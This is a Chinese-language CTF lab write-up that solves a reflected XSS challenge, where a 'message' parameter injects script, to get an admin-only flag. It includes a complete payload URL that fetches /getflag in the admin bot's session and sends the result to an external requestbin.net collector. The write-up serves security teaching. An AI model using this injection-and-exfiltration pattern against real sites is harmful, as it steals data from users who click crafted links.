# LAB - XSS Me
###### tags: `資安` `Web`

## 題目解析
題目是個登入頁面，帳密輸入框可以看到 guest 的 placeholder 值，還有一個比較特別的向 admin 回報錯誤，可以傳網址，這邊就是用程式的方式模仿一個虛擬 admin 收到我們回報的網址，點進去就可以得到 FLAG。

![](https://i.imgur.com/zphQuL5.png)

登入看看可以看到要 admin 帳號才能拿到 FLAG。

![](https://i.imgur.com/UuUiK3Y.png)

## 解題流程
guest 登入後再按登出可以看到一個 window alert，可以從網址上看到實際是傳了一個 message 參數，去觸發了 alert 的 function。
![](https://i.imgur.com/mXWjlsm.png)

所以我們可以試試改 message 的值，看能不能改變 alert 的訊息內容，看起來是可以。

![](https://i.imgur.com/en5IIbP.png)

既然可以控制內容，那或許就能做一些 XSS 攻擊，而我們要想辦法建構一個 URL，讓使用者點了之後，我們能看到結果，先 F12 來看一下 alert 部分的 code。

![](https://i.imgur.com/VB3LExk.png)

先用 \</script\> 把前面的 \<script\> tag 結束，再加一個 \<script\>就可以開始寫想要的 javascript 了，裡面我們用 ajax 的 fetch 來送 http request 到/getflag，就是剛剛要 admin 才能看到 FLAG 的頁面，然後取 response 的 text 再導到一個我們看的到的地方，這邊我們把 FLAG 當成一個參數傳到那個地方，這樣只要能攔截送往 location.href 那個網址的 http request，就可以再 URL 上看到FLAG。

要注意的是這邊的 loacation.href 要使用 Template literals，才能順利把參數寫進 URL，然後把後面加上註解符，理論上就可以順利執行我們的 javascript 了。

以整個流程來說可以想成某個 admin 點了這個連結，讓他送出了 /getflag 的 request，而他就是 admin 所以他的 respones 能拿到 FLAG，再由他主動送出帶 FLAG 參數的 request 到我們的 host。

如果你有自己的 host 就可以用 reverse shell 的方式，直接監聽 request 查看 header，如果沒有就可以跟我這邊一樣用 requestbin.net 的服務。
```
http://h4ck3r.quest:8800/?message=%3C/script%3E%3Cscript%3Efetch(`/getflag`).then(r=%3Er.text()).then(flag=%3Elocation.href=`http://requestbin.net/r/45bvuadz/?${flag}`)//
```

在我們的 requestbin 成功看到返回的 FLAG！
![](https://i.imgur.com/lDBIo00.png)

## FLAG 截圖
![](https://i.imgur.com/bptv2w7.png)

